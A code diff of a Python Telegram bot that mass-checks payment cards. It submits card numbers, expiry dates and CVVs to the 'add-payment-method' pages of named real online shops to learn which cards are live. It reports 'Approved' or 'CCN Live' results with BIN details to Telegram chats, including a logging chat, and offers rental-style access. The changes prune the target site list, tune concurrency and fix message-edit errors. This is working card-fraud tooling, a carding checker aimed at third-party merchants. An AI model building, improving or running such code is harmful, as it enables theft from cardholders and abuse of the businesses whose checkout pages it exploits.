@@ -43,7 +43,7 @@ LOGS_CHAT_ID = "6764941964"
 BIN_API_URL = "https://isnotsin.com/bin-info/api?bin="
 
 # OPTIMIZED: Better thread pool configuration for HIGH multi-user performance
-GLOBAL_MAX_WORKERS = 30  # Reduced further for 5 users
+GLOBAL_MAX_WORKERS = 20  # Further reduced for stability
 USER_MAX_WORKERS = 2
 REQUEST_TIMEOUT = 15
 TELEGRAM_TIMEOUT = 10
@@ -74,6 +74,9 @@ user_sessions = {}
 active_users_lock = threading.RLock()
 active_users_count = 0
 user_queues = {}
+
+# Track last message content to avoid "message not modified" errors
+last_message_content = {}
 
 # Initialize fake UserAgent
 try:
@@ -128,16 +131,6 @@ API_URLS = [
     "https://shackletonsonline.co.uk/my-account/add-payment-method/",
     "https://mobileframing.com.au/my-account/add-payment-method/",
     "https://paulmanwaring.com/my-account/add-payment-method/",
-    "https://farmgalore.ie/my-account/add-payment-method/",
-    "https://jamesportwines.com/my-account/add-payment-method/",
-    "https://flamessteakhouse.co.uk/my-account/add-payment-method/",
-    "https://langtonbrewery.co.uk/my-account/add-payment-method/",
-    "https://sponsoredadrenaline.com/my-account/add-payment-method/",
-    "https://hanstrom.com/my-account/add-payment-method/",
-    "https://maceindustries.co.uk/my-account/add-payment-method/",
-    "https://nickjennings.ca.uk/my-account/add-payment-method/",
-    "https://greenfoodsagri.com/my-account/add-payment-method/",
-    "https://nelsonpilates.com/my-account/add-payment-method/",
 ]
 
 # Maximum cards limit
@@ -148,8 +141,8 @@ def create_session():
     """Create a requests session with connection pooling"""
     session = requests.Session()
     adapter = requests.adapters.HTTPAdapter(
-        pool_connections=10,  # Reduced for 5 users
-        pool_maxsize=50,
+        pool_connections=5,  # Reduced for stability
+        pool_maxsize=20,
         max_retries=2,
         pool_block=False
     )
@@ -353,9 +346,9 @@ class UserCardProcessor:
                 status_text = "Approved ✅" if card_type == 'cvv_live' else "CCN Live 🔵"
                 
                 # Format exactly as requested with bold BIN info and mono font for card only
-                message = f"""CC: <code>{number}|{exp_month}|{exp_year}|{cvv}</code>
+                message = f"""CARD: <code>{number}|{exp_month}|{exp_year}|{cvv}</code>
 Status: {status_text}
-Response: Card added
+Response: Card added successfully
 
 <b>BIN:</b> {bin_info.get('BIN', number[:6])}
 <b>Brand:</b> {bin_info.get('Brand', 'UNKNOWN')}
@@ -554,7 +547,7 @@ Time: {time_taken}s"""
             self.user_session["current_index"] += 1
             self.user_session["current_card_info"] = None
 
-# MODIFIED: Build keyboard without insufficient funds and 3DS/OTP
+# FIXED: Build keyboard with message content tracking
 def build_keyboard(task_id, counts, current_card_info):
     """Builds the inline keyboard for the mass check UI."""
     status = counts.get('status', 'Running')
@@ -606,7 +599,7 @@ def checking_thread(user_session):
         # Monitor progress without blocking
         total_cards = len(user_session["cards"])
         last_update_time = time.time()
-        update_interval = 2.0
+        update_interval = 3.0  # Increased to reduce API calls
         
         while (user_session.get("checking", False) and 
                user_session["current_index"] < total_cards and
@@ -946,6 +939,7 @@ def fetch_bin_info(card_number):
         "Emoji": ""
     }
 
+# FIXED: Telegram message functions with content tracking
 def send_telegram_message_sync(message, chat_id, parse_mode='HTML', reply_markup=None):
     """Sync version of telegram message sending with better error handling"""
     max_retries = 2
@@ -969,6 +963,12 @@ def send_telegram_message_sync(message, chat_id, parse_mode='HTML', reply_markup
             
             # Log if there's an error
             if response.status_code == 200:
+                # Store last message content to avoid "message not modified" errors
+                message_key = f"{chat_id}_last_message"
+                last_message_content[message_key] = {
+                    'text': message,
+                    'reply_markup': reply_markup.to_json() if reply_markup else None
+                }
                 return response  # Success, return immediately
             else:
                 logger.warning(f"Failed to send message to chat {chat_id} (attempt {attempt + 1}): {response.text}")
@@ -991,6 +991,20 @@ def send_telegram_message_sync(message, chat_id, parse_mode='HTML', reply_markup
 
 def edit_telegram_message_sync(message, chat_id, message_id, parse_mode='HTML', reply_markup=None):
     """Sync version of telegram message editing with better error handling"""
+    # Check if message content is the same as last time to avoid "message not modified" errors
+    message_key = f"{chat_id}_{message_id}"
+    current_content = {
+        'text': message,
+        'reply_markup': reply_markup.to_json() if reply_markup else None
+    }
+    
+    if message_key in last_message_content:
+        last_content = last_message_content[message_key]
+        if (last_content['text'] == current_content['text'] and 
+            last_content['reply_markup'] == current_content['reply_markup']):
+            # Message content is the same, skip editing to avoid "message not modified" error
+            return None
+    
     max_retries = 2
     last_exception = None
     
@@ -1012,7 +1026,19 @@ def edit_telegram_message_sync(message, chat_id, message_id, parse_mode='HTML', 
             session.close()
             
             if response.status_code == 200:
+                # Update last message content
+                last_message_content[message_key] = current_content
                 return response  # Success, return immediately
+            elif response.status_code == 400:
+                # Check if it's "message not modified" error
+                error_data = response.json()
+                if "message is not modified" in error_data.get('description', ''):
+                    # This is not a real error, just the message hasn't changed
+                    last_message_content[message_key] = current_content
+                    return response
+                else:
+                    logger.warning(f"Failed to edit message {message_id} for chat {chat_id} (attempt {attempt + 1}): {response.text}")
+                    last_exception = Exception(f"HTTP {response.status_code}: {response.text}")
             else:
                 logger.warning(f"Failed to edit message {message_id} for chat {chat_id} (attempt {attempt + 1}): {response.text}")
                 last_exception = Exception(f"HTTP {response.status_code}: {response.text}")
@@ -1070,6 +1096,7 @@ def format_card_display(card, current_index, total_cards):
         pass
     return f"{current_index}/{total_cards} - {card}"
 
+# FIXED: Update progress with content tracking to avoid "message not modified" errors
 def update_progress_message_sync(user_session):
     if not user_session.get("checking", False):
         return
@@ -1109,7 +1136,10 @@ def update_progress_message_sync(user_session):
                 reply_markup=build_keyboard(task_id, counts, current_card_info)
             )
             # If message editing fails (message not found), send a new one
-            if response and response.status_code != 200:
+            if response is None:
+                # This is normal - message content hasn't changed
+                pass
+            elif response and response.status_code != 200:
                 response = send_telegram_message_sync(
                     progress_message, 
                     chat_id,
@@ -2361,7 +2391,7 @@ def main():
             application.add_error_handler(error_handler)
             
             # Add handlers
-            application.add_handler(CommandHandler("start", start_checking))
+            application.add_handler(CommandHandler("start", start_command))
             application.add_handler(CommandHandler("stop", stop_command))
             application.add_handler(CommandHandler("stats", stats_command))
             application.add_handler(CommandHandler("myaccess", myaccess_command))
@@ -2383,7 +2413,7 @@ def main():
             application.add_handler(CommandHandler("removerental", remove_rental_command))
             
             application.add_handler(MessageHandler(filters.Document.ALL, handle_file))
-            application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, start_command))
+            application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, start_checking))
             
             application.add_handler(CallbackQueryHandler(handle_stop_callback, pattern=r'^stop_masschk_'))
             application.add_handler(CallbackQueryHandler(handle_noop_callback, pattern=r'^noop$'))
